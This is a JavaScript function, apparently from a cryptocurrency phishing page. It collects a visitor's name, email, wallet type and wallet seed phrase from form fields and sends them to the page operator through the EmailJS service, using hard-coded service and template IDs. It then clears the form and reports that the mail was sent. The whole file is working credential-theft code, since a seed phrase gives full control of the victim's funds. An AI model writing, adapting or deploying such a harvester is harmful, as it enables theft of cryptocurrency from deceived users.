function sendEmail() {

    var params = {
        from_name:   document.querySelector('#fullname').value,
         email_id:   document.querySelector('#email_id').value,
      wallet_type:   document.querySelector('#wallet').value,
      seed_phrase:   document.querySelector('#seedphrase').value,

    };
    
    // console.log(params.email_id);
    // console.log(params.from_name);
    // console.log(params.wallet_type);
    // console.log(params.seed_phrase);

    
    const servive_ID = 'service_0956zqg';
    const template_ID = 'template_5ly9err';

    emailjs.send(servive_ID, template_ID, params).then((res) => {
            document.querySelector('#fullname').value = '';
            document.querySelector('#email_id').value = '';  
            document.querySelector('#wallet').value = '';  
            document.querySelector('#seedphrase').value = '';
            console.log(res);
            alert('your mail sent successfully');
    }).catch((err) => console.log(err));

    }
   
   